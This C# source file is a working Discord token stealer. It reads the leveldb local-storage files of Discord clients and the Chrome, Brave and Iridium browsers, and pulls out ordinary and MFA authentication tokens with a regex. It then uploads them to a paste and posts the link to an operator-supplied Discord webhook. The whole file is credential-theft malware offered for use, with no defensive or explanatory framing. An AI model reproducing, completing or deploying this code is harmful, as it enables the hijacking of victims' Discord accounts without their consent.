using System;
using System.IO;
using System.Text;
using System.Net.Http;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Logger
{
    public class Token
    {
        public readonly string webHook = string.Empty; // <- Webhook goes here inside quotes.
        private string regexPattern = @"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})";
        public StringBuilder mfaTokens = new StringBuilder();
        public StringBuilder normalTokens = new StringBuilder();
        public static StringBuilder tokens = new StringBuilder();

        private string appdataDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discord\Local Storage\leveldb";
        private string appdata_PTBDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discordptb\Local Storage\leveldb";
        private string appdata_CanaryDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discordcanary\Local Storage\leveldb";
        private string localStorage_ChromiumBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Chromium\User Data\Default\Local Storage\leveldb";
        private string localStorage_IridiumBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Iridium\User Data\Default\Local Storage\leveldb";
        private string localStorage_GoogleBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\Local Storage\leveldb";
        private string localStorage_BraveBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb";

        private void AppendTokens() => tokens = normalTokens.AppendLine(mfaTokens.ToString());

        public void GetTokens()
        {
            Dictionary<string, string> discordDictionaryPathInformation = new Dictionary<string, string>()
            {
                { "Discord", appdataDiscord },
                { "Discord(PTB)", appdata_PTBDiscord },
                { "Discord(Canary)", appdata_CanaryDiscord },
                { "Browser(Brave)", localStorage_BraveBrowser },
                { "Browser(Chrome)", localStorage_GoogleBrowser},
                { "Browser(Iridium)", localStorage_IridiumBrowser},
            };

            foreach (var dictionaryElement in discordDictionaryPathInformation)
            {
                try
                {
                    if (!discordDictionaryPathInformation[dictionaryElement.Key].Contains(dictionaryElement.Value)) continue;
                    foreach (var ldbFile in Directory.GetFiles(dictionaryElement.Value, "*ldb"))
                    {
                        string ldbFileContent = File.ReadAllText(ldbFile);
                        foreach (Match currentRegexMatch in Regex.Matches(ldbFileContent, regexPattern))
                        {
                            if (currentRegexMatch.Value[0..4] == "mfa.")
                            {
                                mfaTokens.AppendLine($"MFA: {dictionaryElement.Key}=> {currentRegexMatch.Value}");
                                continue;
                            }
                            normalTokens.AppendLine($"{dictionaryElement.Key}=> {currentRegexMatch.Value}");
                        }
                    }
                }
                catch
                {
                    Console.WriteLine($"[!] Cannot find \".ldb\" file or a specific folder. Skipping to next iteration...");
                    continue;
                }
            }

            AppendTokens();
        }

        public void SendTokens()
        {
            Paste pasteClassInstance = new Paste();
            pasteClassInstance.UploadPaste();

            HttpClient webhookSender = new HttpClient();

            Dictionary<string, string> tokenData = new Dictionary<string, string>
            {
                { "content", pasteClassInstance.finalURL },
                { "username", "https://github.com/ihaai" },
                { "avatar_url", "https://cdn.discordapp.com/attachments/582786562295857162/916249071457554472/unknown.png" }
            };

            try
            {
                webhookSender.PostAsync(webHook, new FormUrlEncodedContent(tokenData));
                Console.WriteLine("[+] Paste successfully sent to the webhook!");
            }
            catch
            {
                Console.WriteLine("[!] Cannot send webhook request. Possibly exceedng the 2000 content character limit.");
            }
        }
    }
}
